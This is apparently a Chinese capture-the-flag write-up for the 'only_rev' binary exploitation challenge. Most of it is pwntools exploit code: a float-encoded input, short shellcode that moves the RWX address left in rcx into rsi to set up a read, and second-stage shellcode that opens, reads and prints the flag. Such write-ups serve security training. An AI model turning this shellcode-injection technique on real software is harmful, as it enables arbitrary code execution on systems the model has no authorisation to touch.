# only_rev

## 题目简述

该题与 `only` 思路接近，关键是 syscall 后 `rcx` 中保留 RWX 段地址。利用 `mov rsi, rcx` 配合 syscall 获取 read primitive，再发送读取 flag 的 shellcode。

## 解题过程

### 关键观察

该题与 `only` 思路接近，关键是 syscall 后 `rcx` 中保留 RWX 段地址。

### 求解步骤

和only并无区别，用syscall向rcx写入rwx段地址，传给rsi后syscall即可拿到read。
p.sendlineafter(b"input:\n","8.5925645443139351e-246")
p.sendlineafter(b"Make a choice:",b'1')

sc = '''
    pop rdx
    pop rsi
    pop rdx
    pop rsi
    pop rsi
    pop rsi
    syscall
'''
sc = asm(sc)
print(len(sc))
dbg()
p.sendafter(b"your code:", sc)
sc2 = asm(shellcraft.open("/flag",0,0) + shellcraft.read(3, "rsp", 0x100) +
shellcraft.write(1, "rsp", 0x100))
pause()
p.sendline(b'\x90'*0x100+sc2)
p.interactive()

# import struct

# hex_val = 0x0D0E0A0D0B0E0E0F

# double_val = struct.unpack('d', struct.pack('Q', hex_val))[0]


# print("double value:", double_val)
# print("as input string (17 sig digits):", format(double_val, ".17g"))

from pwn import *
filename = './chal'
# libc = ELF("./libc.so.6")
host= '<challenge-host>'
port= 26000

sla = lambda x,s : p.sendlineafter(x,s)
sl = lambda s : p.sendline(s)
sa = lambda x,s : p.sendafter(x,s)
s = lambda s : p.send(s)
e = ELF(filename)
context.log_level='debug'
context(arch=e.arch, bits=e.bits, endian=e.endian, os=e.os)
def run(mode, script = ""):
    if "d" in mode:
        p = gdb.debug(filename, script)
    elif "l" in mode:
        p = process(filename)
    elif "r" in mode:
        p = remote(host, port)
    elif "a" in mode:
        p = process(filename)
        gdb.attach(p, script)
    return p

def getp():
    global script
    if len(sys.argv) == 2:
        p = run(sys.argv[1], script)
    else:
        p = run("l", script)
    return p

script = '''
go
'''
def pwn():
    global p
    p = getp()

    hex_value = 0xD0E0A0D0B0E0E0F
    float_value = struct.unpack('d', struct.pack('Q', hex_value))[0]
    print(f"The float value of 0x{hex_value:X} is: {float_value}")
    sla('3.', '2')
    sla('input', str(float_value))
    sla(':', '1')
    pause()
    shellcode = '''
syscall
mov rsi, rcx
mov dl, 0xff
syscall
'''
    shellcode = asm(shellcode)
    sa(':', shellcode)
    sleep(0.5)

### 跨页补回：第二阶段 shellcode 收尾

s(asm('nop;'*0x40+'lea rsp, [rip+0x800];' + shellcraft.open('flag', 0, 0)
+ shellcraft.read('rax', 'rsp', 0x100) + shellcraft.write(1, 'rsp', 0x100)))

pwn()
p.interactive()

## 方法总结

- 核心技巧：利用 syscall 后寄存器副作用传递 RWX 地址。
- 识别信号：`rcx` 保留可执行内存地址且后续可执行用户 shellcode。
- 复用要点：先把 `rcx` 搬到 `rsi` 作为 read 缓冲区，再发送完整 shellcode。
